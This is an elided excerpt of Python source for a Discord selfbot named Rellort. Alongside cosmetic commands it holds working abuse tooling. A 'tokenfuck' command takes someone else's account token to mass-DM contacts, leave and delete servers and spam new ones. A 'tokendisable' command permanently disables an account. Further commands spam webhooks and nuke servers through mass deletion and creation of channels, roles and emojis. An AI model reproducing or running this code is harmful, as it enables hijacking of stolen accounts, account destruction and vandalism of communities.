...
os.system("title Rellort Selfbot - Please remember to star it - it took hours and I've released the source!")
...
#This took lots of hours to work on. Signing up to github takes about 3 minutes max, starring my post  - https://www.youtube.com/channel/UCuPc4-6E3Eqb7NjJPSRmcgw - takes 5 seconds. If you wouldn't mind pressing the star I'd really appreciate it!
#Have fun :)
...
Rellort = commands.Bot(prefix.strip(), self_bot=True)
Rellort.remove_command("help") #this lets me add my own custom help cmd, rather then the ugly default one

editedmessages ={}

spinner = Halo(
    text=' | Rellort Selfbot - Connecting',
    spinner={
        'interval': 250,
        'frames': ['.', '..', '...']
    }
...
def screen():
    ...
    while True:
        ...
        os.system(f"title Rellort Selfbot - Running on {Rellort.user.name} - Enjoy")
        logo = f"""



				        {Fore.WHITE}Connected To : {Fore.WHITE}[{Fore.RED}{Rellort.user.name}#{Rellort.user.discriminator}{Fore.WHITE}]
				        ...
				        Total Guilds : {Fore.WHITE}[{Fore.RED}{len(Rellort.guilds)}{Fore.WHITE}]
...
@Rellort.command(aliases=['color', 'colour',"colourinfo","hex"])
async def colorinfo(ctx,hexcolor=None):
    ...
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.message.edit(content="",embed=embed)


@Rellort.command(aliases=["poll"])
async def suggest(ctx,*,message="Supply something to suggest lol!"):
    await ctx.message.delete()
    randcolor = random.randint(0x000000, 0xFFFFFF) 
    try:
        embed=discord.Embed(title=f"Rellort selfbot - poll", description=f"Poll message : `{message}`", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
...
###
@Rellort.command(aliases=["encode","base64","base64encode","encodebase64"])
...
@Rellort.command(aliases=["decode","base64decode","decodebase64"])
...
@Rellort.command(aliases=["iplocate","locateip","ipgeolocate"])
async def ip(ctx, *, iparg="1.1.1.1"):
    ...
    if personalip in desc:
        ...
        embed=discord.Embed(title=f"Rellort selfbot - ip locator", description="Your ip was detected in this data - to double check that your ok with showing the data\npress the reaction button below!", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        ...
        while reactionstuffyes:
            try:
                reaction, user = await Rellort.wait_for('reaction_remove', timeout=10, check=requirements)
                embed=discord.Embed(title=f"Rellort selfbot - ip locator", description=desc, color=randcolor)
                embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
                ...
                embed=discord.Embed(title=f"Rellort selfbot - Ip locator", description="You took too long to react - try running this command again or sum", color=randcolor)
                embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
                await message.edit(embed=embed)
...
@Rellort.command(aliases=["infotoken"])
async def tokeninfo(ctx, bokenxd):
    ...
    # user info
        ...
        embed=discord.Embed(title=f"Rellort selfbot - Token info", description=f"Site responded with status code : `{data.status_code}`\nMessage : `{data.text}`", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await ctx.send(embed=embed)


@Rellort.command(aliases=['pong', 'latency'])
async def ping(ctx,afkstatus=None):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title=f"Rellort selfbot - ping pong ping pong ping pong ping pong ping pong ping pong ping pong ping pong ping pong ping pong", description=f'🏓 pong | {round(Rellort.latency * 1000)}ms', color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.send(embed=embed)


@Rellort.command(aliases=['commands', 'commandlist',"commandslist","allcommands","h"])
...
"""   
    ...
    embed=discord.Embed(title=f"Goonie W", description=description, color=0x36393f)
    await ctx.send(embed=embed)
...
@Rellort.command(aliases=['afkoff', 'afkon'])
async def afk(ctx,afkstatus=None):
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Goonie W - Afk auto messager", description=f"Afk messages are now : `{isafk}`\nTry {prefix.strip()}afkmessage [message]", color=randcolor)
    embed.set_thumbnail(url="https://media4.giphy.com/media/AocCNvGki0tVu/giphy.gif")
    embed.set_footer(text="https://discord.gg/A88CDYkf")
    await ctx.message.edit(content="",embed=embed)

@Rellort.command(aliases=['afkmessage', 'afkmessageedit'])
async def afkmsg(ctx,*,afkstatus="I'm afk , wait for me to reply"):
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Afk auto messager", description=f"Afk messages are : `{isafk}`\nAfk message is : `{messagetosendwhenafk}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://discord.gg/A88CDYkf")
    await ctx.message.edit(content="",embed=embed)

@Rellort.command(aliases=["timerunning","elapsed"])
async def uptime(ctx):
    ...
    seconds = timedata - 60*minutes
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Uptime", description=f"Rellort has been running for `{'%d:%d:%d' %(hours,minutes,seconds)}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://discord.gg/A88CDYkf")
    await ctx.message.edit(content="",embed=embed)


@Rellort.command(aliases=["cylegame","cyclegamestatus","gamestatuscycle"])
async def gamecycle(ctx):
    global statusdata
    global delaybetweencycle
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Game Cycle", description=f"Cycling these statuses:\n`{statusdata}`\nDelay:\n`{delaybetweencycle}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://discord.gg/A88CDYkf")
    await ctx.message.edit(content="",embed=embed)
    while True:
        for gamestatus in statusdata:
            await Rellort.change_presence(status=discord.Status.online, activity=discord.Game(name=gamestatus))
            await asyncio.sleep(int(delaybetweencycle)) 

@Rellort.command(aliases=["cyclestatus","statuscycle","cyclebio"])
async def biocycle(ctx):
    global statusdata
    global delaybetweencycle
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Bio Cycle", description=f"Cycling these statuses:\n`{statusdata}`\nDelay:\n`{delaybetweencycle}`", color=randcolor)
    embed.set_thumbnail(url="https://media4.giphy.com/media/AocCNvGki0tVu/giphy.gif")
    embed.set_footer(text="https://discord.gg/A88CDYkf")
    await ctx.message.edit(content="",embed=embed)
...
@Rellort.command(aliases=["cyclewatch","cyclewatchstatus","watchstatuscycle","cyclewatchingstatus","cyclewatching","watchingcycle"])
async def watchcycle(ctx):
    global statusdata
    global delaybetweencycle
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Watch Cycle", description=f"Cycling these statuses:\n`{statusdata}`\nDelay:\n`{delaybetweencycle}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.message.edit(content="",embed=embed)
    while True:
        for watchstatus in statusdata:
            await Rellort.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=watchstatus))
            await asyncio.sleep(int(delaybetweencycle)) 

@Rellort.command(aliases=["nickcycle","cyclenick","cyclenickname","cyclenicknames","nicknamescycle","nicknames","nickname"])
async def nicknamecycle(ctx,statustocycle=None):
    ...
    if statustocycle == None or statustocycle.lower() == "yes" or statustocycle.lower() == "on":
        ...
        embed=discord.Embed(title="Rellort Selfbot - Nickname Cycle", description=f"Cycle status : `{nicknamestuffyes}`\n{prefix.strip()}nicknamecycle **to start the cycle**", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await ctx.message.edit(content="",embed=embed)


@Rellort.command(aliases=["nickdelay","nicknamedelay","delaynicks","delaynick","delaynicknames","addnicknamedelay","changenicknamedelay"])
async def nicknamecycledelay(ctx,newdelay="5"):
    global delaybetweennicknamecycle
    randcolor = random.randint(0x000000, 0xFFFFFF)
    delaybetweennicknamecycle = int(newdelay)
    embed=discord.Embed(title="Rellort Selfbot - Nickname Delay", description=f"Delay is now : `{delaybetweennicknamecycle} seconds`\n{prefix.strip()}nicknamecycle", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.message.edit(content="",embed=embed)

@Rellort.command(aliases=["statusdelay","watchdelay","gamedelay","twitchdelay","listendelay","adddelay","addstatusdelay"])
async def cycledelay(ctx,newdelay="5"):
    global delaybetweencycle
    delaybetweencycle = int(newdelay)
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Cycle Delay", description=f"Delay is now : `{delaybetweencycle} seconds", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://discord.gg/A88CDYkf")
    await ctx.message.edit(content="",embed=embed)

@Rellort.command(aliases=["cyclelisten","cyclelisteningstatus","listenstatuscycle","cyclelistenstatus","cyclelistening","listeningcycle"])
async def listencycle(ctx):
    global statusdata
    global delaybetweencycle
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Listen Cycle", description=f"Cycling these statuses:\n`{statusdata}`\nDelay:\n`{delaybetweencycle}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
    await ctx.message.edit(content="",embed=embed)
    while True:
        for listenstatus in statusdata:
            await Rellort.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=listenstatus))
            await asyncio.sleep(int(delaybetweencycle)) 

@Rellort.command(aliases=["cyclestream","streamstatuscycle","cyclestreamingstatus","cyclestreaming","streamingcycle"])
async def streamcycle(ctx):
    global statusdata
    global delaybetweencycle
    global streamurl
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Stream Cycle", description=f"Cycling these statuses:\n`{statusdata}`\nDelay:\n`{delaybetweencycle}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://discord.gg/A88CDYkf")
    await ctx.message.edit(content="",embed=embed)
    while True:
        for streamstatus in statusdata:
            ...
            await Rellort.change_presence(activity=stream) 
            await asyncio.sleep(int(delaybetweencycle)) 

@Rellort.command(aliases=['listening'])
async def listen(ctx, *, listenstatus="I didn't know how to specify a listen status lol"):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    await Rellort.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=listenstatus))
    embed=discord.Embed(title="Rellort Selfbot - Listen Status", description=f"Status is now : `Listening to {listenstatus}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://discord.gg/A88CDYkf")
    await ctx.message.edit(content="",embed=embed)

@Rellort.command(aliases=['gaming'])
async def game(ctx, *, gamestatus="I didn't know how to specify a game status lol"):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    await Rellort.change_presence(status=discord.Status.dnd, activity=discord.Game(name=gamestatus))  #I thought using dnd spicened it up a bit - I don't think I've ever seen a selfbot use dnd as to my belief it doesn't work for some of the other stuff - this makes it unique ig 
    embed=discord.Embed(title="Rellort Selfbot - Game Status", description=f"Status is now : `Playing {gamestatus}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://discord.gg/A88CDYkf")
    await ctx.message.edit(content="",embed=embed)

@Rellort.command(aliases=['watching'])
async def watch(ctx, *, watchstatus ="I didn't know how to specify a watch status lol"):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    await Rellort.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=watchstatus))    
    embed=discord.Embed(title="RELLORT - Watch Status", description=f"Status is now : `Watching {watchstatus}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://discord.gg/A88CDYkf")
    await ctx.message.edit(content="",embed=embed)

@Rellort.command(aliases=['twitch'",twitchstream","streaming"])
async def stream(ctx, *, streamstatus): 
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    await Rellort.change_presence(activity=stream)  
    embed=discord.Embed(title="Rellort Selfbot - Stream Status", description=f"Status is now : `Streaming {streamstatus}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://discord.gg/A88CDYkf")
    await ctx.message.edit(content="",embed=embed)

@Rellort.command(aliases=['streamurl'])
async def twitchurl(ctx, streamurltouse): 
    global streamurl
    randcolor = random.randint(0x000000, 0xFFFFFF)
    streamurl = streamurltouse
    embed=discord.Embed(title="Rellort Selfbot - Stream Url Changed", description=f"Streamurl is now : `{streamurl}`\nTry {prefix.strip()}stream or {prefix.strip()}streamcycle", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://discord.gg/A88CDYkf")
    await ctx.message.edit(content="",embed=embed)
       

@Rellort.command(aliases=["btc","btcusd","usdbtc"])
async def bitcoin(ctx):
    data = requests.get("https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD").text
    j = json.loads(data)
    dolor = j['USD']
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Bitcoin command", description=f"Bitcoin value : `${dolor}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://discord.gg/A88CDYkf")
    await ctx.message.edit(content="",embed=embed)


@Rellort.command(aliases=["invitelink","makeinvite","createinvite"])
async def invite(ctx): 
    ...
    embed=discord.Embed(title="RELLORT Selfbot -Invite Creation", description=f"Invite Made - https://discord.gg/{str(inv.json()['code'])}", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://discord.gg/A88CDYkf")
    await ctx.message.edit(content="",embed=embed)

@Rellort.command(aliases=["deleteaftertime"])
async def timetodeleteafter(ctx,deletetime):
    global deleteaftertime
    randcolor = random.randint(0x000000, 0xFFFFFF)
    deleteaftertime = deletetime
    embed=discord.Embed(title="RELLORT Selfbot - Delete after time Edited", description=f"Delete after time is now : `{deletetime} seconds`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://discord.gg/A88CDYkf")
    await ctx.message.edit(content="",embed=embed)

@Rellort.command(aliases=['deleteafter', 'afterdelete'])
async def deletemessagesafter(ctx,delstatus=None):
    ...
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Rellort Selfbot - Delete after", description=f"Deleting messages after they've been sent : `{deleteafter}`\nTime between them being sent and deletion : `{deleteaftertime}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://discord.gg/A88CDYkf")
    await ctx.message.edit(content="",embed=embed)
...
async def on_connect():
    ...
    try:
        ...
        f = open(f"./data/{str(Rellort.user.id)}.ico",'r')
        f.close()
    except:
        response = requests.get(Rellort.user.avatar_url, stream=True)
        with open(f"./data/{str(Rellort.user.id)}.png", 'wb') as Rellort_pfp: 
            shutil.copyfileobj(response.raw, Rellort_pfp)

        filename = f"./data/{str(Rellort.user.id)}.png"
        img = Image.open(filename)
        img.save(f"./data/{str(Rellort.user.id)}.ico",format = 'ICO', sizes=[(32,32)])
...
@Rellort.command(aliases=['deletechans', 'deleteallchannels',"delchan","delchans","channeldel","channeldeletion"])
...
@Rellort.command(aliases=['deleterols', 'deleteallroles',"delroles","roledel","delrols","roldel","roledeletion"])
...
def ssspam(webhook):
    ...
    while spammingdawebhookeroos:
        ...
        data = {
          ...
          "embeds": [
            {
              ...
              "author": {
                "name": "Goonie",
                "url": "https://www.youtube.com/channel/UCuPc4-6E3Eqb7NjJPSRmcgw",
                "icon_url": "https://media4.giphy.com/media/AocCNvGki0tVu/giphy.gif"
              },
              "footer": {
                "text": "GOONIE , RELLORT , UBBERS ON TOP",
                "icon_url": "https://media4.giphy.com/media/AocCNvGki0tVu/giphy.gif"
              },
              "image": {
                "url": "https://media4.giphy.com/media/AocCNvGki0tVu/giphy.gif"
              },
              "thumbnail": {
                "url": "https://media4.giphy.com/media/AocCNvGki0tVu/giphy.gif"
              }
          ...
          "username": "Goonie nuker goonie nuker - an advanced selfbot made open source on github! @@@@",
          "avatar_url": "https://media4.giphy.com/media/AocCNvGki0tVu/giphy.gif"
        }
...
@Rellort.command(aliases=['webhookfuck', 'spamwebhooks',"webhooknuke","webhooksnuke","webhooksfuck","spamwebhook"])
    ...
    for i in range(webhookamount):  #sooo - a bit about this. 50 webhooks can usually be made at once - it'll give you the option to make more but return "internal error" - this is an efficient way to make the correct amount of channels and get the best possible spam (multiple webhooks in one channel isnt efficient)
        for channel in ctx.guild.text_channels:
            ...
            try:
                ...
                webhook =await channel.create_webhook(name='Nuked via Rellort ig')
                threading.Thread(target = ssspam, args = (webhook.url,)).start()
...
@Rellort.command(aliases=['spamrole', 'rolefuck',"fuckrole","fuckroles","rolesfuck","nukeroles","rolenuke"])
async def rolespam(ctx,amountofthemtomake=None,*,nameofthem=None):
    await ctx.message.delete()
    if nameofthem == None:
        nameofthem = "Nuked via goonie ig"
...
@Rellort.command(aliases=['stopwebhookfuck', 'webhookstop',"webhookspamstop","stopwebhooksspam","webhookspamoff"])
...
@Rellort.command(aliases=['textchannelcreation', 'textchannelnuke',"channelspam","nuketextchannels","channelsspam"])
async def nuketextchannel(ctx,amountofthemtomake=None,*,nameofthem=None):
    await ctx.message.delete()
    if nameofthem == None:
        nameofthem = "Nuked-via-rellort-ig"
    else:
...
@Rellort.command(aliases=['emojicreation', 'emojinuke',"emojisspam","nukeemojis","emojispam","emojisnuke","emotespam"])
async def emotenuke(ctx):
    await ctx.message.delete()
    with open("data/Rellort-bomb-emoji-for-server-nukes.jpeg", "rb") as f:
        img1 = f.read()
    with open("data/Rellort-clown-emoji-for-server-nukes.jpeg", "rb") as f:
        img2 = f.read()
    with open("data/Rellort-nuke-emoji-for-server-nukes.jpeg", "rb") as f:
        img3 = f.read()

    with open("data/Rellort-orange-justice-gif-for-server-nukes.jpeg", "rb") as f:
        gif1 = f.read()

    with open("data/Rellort-nuke-gif-for-server-nukes.jpeg", "rb") as f:
        gif2 = f.read()
...
@Rellort.command(aliases=['hypehousechange', 'hypehouse',"hypesquadchange","changehypesquad","changehypehouse","househype"])
async def hypesquad(ctx,squad=None):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if squad == None:
        embed=discord.Embed(title="Relloer Selfbot - Hypesquad Changer", description=f"Options : \n`{prefix.strip()}hypesquad bravery`\n`{prefix.strip()}hypesquad brilliance`\n`{prefix.strip()}hypesquad balance`", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await ctx.message.edit(content="",embed=embed)
    else:
        ...
        if data.status_code == 204:
            embed=discord.Embed(title="Rellort Selfbot - Hypesquad Changer", description=f"Hypesquad changed successfully", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
            await ctx.message.edit(content="",embed=embed)
        else:
            embed=discord.Embed(title="Rellort Selfbot - Hypesquad Changer", description=f"Error - Site responded with status code : `{data.status_code}`\nMessage : `{data.text}`", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
            await ctx.message.edit(content="",embed=embed)
...
@Rellort.command(aliases=['botconvert', 'botsay', 'convertbot'])
    ...
    if ctx.guild == None:
       ...
       # msg = await ctx.message.edit(content="",embed=embed)
        if len(await ctx.channel.webhooks()) != 0:
            ...
            webhook =await ctx.channel.create_webhook(name='Rellort-selfbot')
        data={
          "content": f"{message}",
...
def makeguildxd(tokentouse,nukemsg):
    ...
    # with open("data/Rellort-clown-emoji-for-server-nukes.png", "rb") as img:
...
@Rellort.command(aliases=['tokenfuck',"tockenfuck","fucktocken","accountfuck","fuckaccount"])
async def fucktoken(ctx,tokentofrick=None,*,nukemsg=f"This account was nuked with the help of Rellort! - GG"):
    global serversmade
    serversmade = 0
    randcolor = random.randint(0x000000, 0xFFFFFF)
    await ctx.message.delete()
    if tokentofrick == None:
        embed=discord.Embed(title="Rellort Selfbot - Token Fuck", description=f"Supply a token - {prefix.strip()}tokenfuck [token-here] [message-to-nuke-with]", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await ctx.message.edit(content="",embed=embed)
        ...
        embed=discord.Embed(title="Rellort Selfbot - Token Fuck", description=f"Try do this command in a private server - it has problems in dms!", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await ctx.message.edit(content="",embed=embed)

    else:
        embed=discord.Embed(title="Rellort Selfbot - Token Fuck", description=f"If your sure you want to token fuck the account, react with the emoji below.\nThis process will dm all open dms , then close them, leave all servers, and make a ton of servers", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        message = await ctx.send(embed=embed)        
        await message.add_reaction('✅')
        ...
        while reactionstuffyes:
            try:
                reaction, user = await Rellort.wait_for('reaction_remove', timeout=10, check=requirements)
                embed=discord.Embed(title="Rellort Selfbot - Token Fuck", description=f"You reacted, the process has started!\nValidating token...", color=randcolor)
                embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
                await message.edit(embed=embed)
                await message.clear_reactions()
                ...
                if tokendata.status_code != 200:
                    embed=discord.Embed(title="Rellort Selfbot - Token Fuck", description=f"Error - are you sure that token is correct?\nDiscord responded with : `{tokendata.text}`", color=randcolor)
                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
                    await message.edit(embed=embed)           
                else:
                    embed=discord.Embed(title="Rellort Selfbot - Token Fuck", description=f"Token valid - continuing the process", color=randcolor)
                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
                    await message.edit(embed=embed)      
                    ...
                    randcolor = random.randint(0x000000, 0xFFFFFF)
                    embed=discord.Embed(title="Rellort Selfbot - Token Fuck", description=f"Messaged {usersmessaged} people saying : `{nukemsg}` and cleared the conversation after", color=randcolor)
                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
                    await message.edit(embed=embed)              
                    ...
                    randcolor = random.randint(0x000000, 0xFFFFFF)
                    embed=discord.Embed(title="Rellort Selfbot - Token Fuck", description=f"Left `{serversleft}` servers", color=randcolor)
                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
                    await message.edit(embed=embed)  
                    ...
                    randcolor = random.randint(0x000000, 0xFFFFFF)
                    embed=discord.Embed(title="Rellort Selfbot - Token Fuck", description=f"Deleted `{serversdeleted}` servers", color=randcolor)
                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
                    try:
                        await message.edit(embed=embed)  
                    ...
                    randcolor = random.randint(0x000000, 0xFFFFFF)
                    embed=discord.Embed(title="Rellort Selfbot - Token Fuck", description=f"Made {serversmade} servers", color=randcolor)
                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
                    try:
                        await message.edit(embed=embed)  
                ...
                embed=discord.Embed(title="Rellort Selfbot - Token Fuck", description=f"You took too long - Run this command again if you wish to token fuck an account", color=randcolor)
                embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
                await message.edit(embed=embed)
                await message.clear_reactions()
...
@Rellort.command(aliases=['disabletoken',"tokendisabler","deleteaccount","accountdelete"])
async def tokendisable(ctx,tokentofrick=None):

    randcolor = random.randint(0x000000, 0xFFFFFF)
    await ctx.message.delete()
    if tokentofrick == None:
        embed=discord.Embed(title="Rellort Selfbot - Token Disabler", description=f"Supply a token - {prefix.strip()}tokendisable [token-here] ", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await ctx.message.edit(content="",embed=embed)
        ...
        embed=discord.Embed(title="Rellort Selfbot - Token Disabler", description=f"Try do this command in a private server - it has problems in dms (working on fixing)!", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await ctx.message.edit(content="",embed=embed)

    else:
        embed=discord.Embed(title="Rellort Selfbot - Token Disabler", description=f"If your sure you want to disable that token, react.\nDisabling means that the account will be DISABLED - the chances of recovering it are pratically impossible.", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        message = await ctx.send(embed=embed)        
        await message.add_reaction('✅')
        ...
        while reactionstuffyes:
            try:
                reaction, user = await Rellort.wait_for('reaction_remove', timeout=10, check=requirements)
                embed=discord.Embed(title="Rellort Selfbot - Token Disabler", description=f"You reacted, the process has started!\nDisabling token", color=randcolor)
                embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
                await message.edit(embed=embed)
                await message.clear_reactions()
                ...
                randcolor = random.randint(0x000000, 0xFFFFFF)
                if tokendata.status_code != 200:
                    embed=discord.Embed(title="Rellort Selfbot - Token Disabler", description=f"Token disabled - discord responds with : `{tokendata.text}`", color=randcolor)
                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
                    await message.edit(embed=embed)           
                else:
                    embed=discord.Embed(title="Rellort Selfbot - Token Disabler", description=f"Token valid - strange - try again maybe?", color=randcolor)
                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                    embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
                    await message.edit(embed=embed)      

            except asyncio.TimeoutError:
                embed=discord.Embed(title="Rellort Selfbot - Token Disabler", description=f"You took too long - Run this command again if you wish to DISABLE an account", color=randcolor)
                embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
                await message.edit(embed=embed)
                await message.clear_reactions()
...
@Rellort.command(aliases=["snipeedit"])
async def editsnipe(ctx):
    global editedmessages
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if str(ctx.channel.id) in editedmessages:
        msgsniped = editedmessages[str(ctx.channel.id)]
        embed=discord.Embed(title="Rellort Selfbot - Edit snipe", description=f"Message sniped:\n{msgsniped}", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
